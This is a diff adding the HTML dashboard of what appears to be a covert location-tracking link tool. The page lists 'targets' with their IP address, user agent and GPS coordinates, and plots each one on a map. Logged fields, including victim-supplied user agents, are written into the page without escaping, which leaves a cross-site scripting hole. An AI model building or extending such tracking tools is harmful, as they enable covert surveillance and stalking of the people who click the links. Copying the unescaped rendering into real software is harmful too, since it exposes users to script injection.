@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>:: VIEW TRACKING LOGS ::</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style> #map { height: 400px; width: 100%; margin-top: 20px; border: 1px solid #0f0; } </style>
+</head>
+<body>
+    <div class="container full-width">
+        <h1 class="main-title">> TRACKING_LOGS.DAT</h1>
+        <div class="nav-links">
+            <a href="/index.html">[ &lt;&lt; BACK ]</a>
+            <a href="#" id="refresh-btn">[ REFRESH DATA ]</a>
+        </div>
+        
+        <div id="map"></div>
+
+        <div id="log-section"><p class="highlight">> Initializing log stream...</p></div>
+    </div>
+
+    <script>
+        const logSection = document.getElementById('log-section');
+        let map;
+        let markersLayer = L.layerGroup();
+
+        function initMap() {
+            map = L.map('map').setView([-2.5489, 118.0149], 5); // Center on Indonesia
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+            }).addTo(map);
+            markersLayer.addTo(map);
+        }
+
+        async function fetchLogs() {
+            logSection.innerHTML = "<p class='highlight'>> Fetching data from server...</p>";
+            markersLayer.clearLayers();
+            try {
+                const res = await fetch('/api/locations');
+                const rows = await res.json();
+
+                if (!rows || !rows.length) {
+                    logSection.innerHTML = "<p class='error'>> NO LOG DATA FOUND.</p>";
+                    return;
+                }
+
+                let html = `<table class="hacker-table">
+                    <thead><tr>
+                        <th>Timestamp</th><th>Target ID</th><th>Link ID</th><th>IP Address</th>
+                        <th>User Agent</th><th>Coords</th>
+                    </tr></thead><tbody>`;
+                
+                rows.forEach(r => {
+                    const mapUrl = `https://www.google.com/maps?q=${r.latitude},${r.longitude}`;
+                    html += `<tr>
+                        <td>${new Date(r.created_at).toLocaleString('id-ID')}</td>
+                        <td class="highlight">${r.username}</td>
+                        <td>${r.tracker_id}</td>
+                        <td>${r.ip_address}</td>
+                        <td class="user-agent">${r.user_agent}</td>
+                        <td><a href="${mapUrl}" target="_blank">View Map</a></td>
+                    </tr>`;
+                    
+                    // Add marker to map
+                    const marker = L.marker([r.latitude, r.longitude]).addTo(markersLayer);
+                    marker.bindPopup(`<b>${r.username}</b><br>${new Date(r.created_at).toLocaleString()}<br>IP: ${r.ip_address}`);
+                });
+                html += "</tbody></table>";
+                logSection.innerHTML = html;
+                
+                // Adjust map view to fit all markers
+                if (rows.length > 0) {
+                    map.fitBounds(markersLayer.getBounds());
+                }
+
+            } catch (error) {
+                logSection.innerHTML = `<p class="error">> FAILED TO FETCH LOGS: ${error.message}</p>`;
+            }
+        }
+
+        document.getElementById('refresh-btn').addEventListener('click', fetchLogs);
+        document.addEventListener('DOMContentLoaded', () => {
+            initMap();
+            fetchLogs();
+        });
+    </script>
+</body>
+</html>
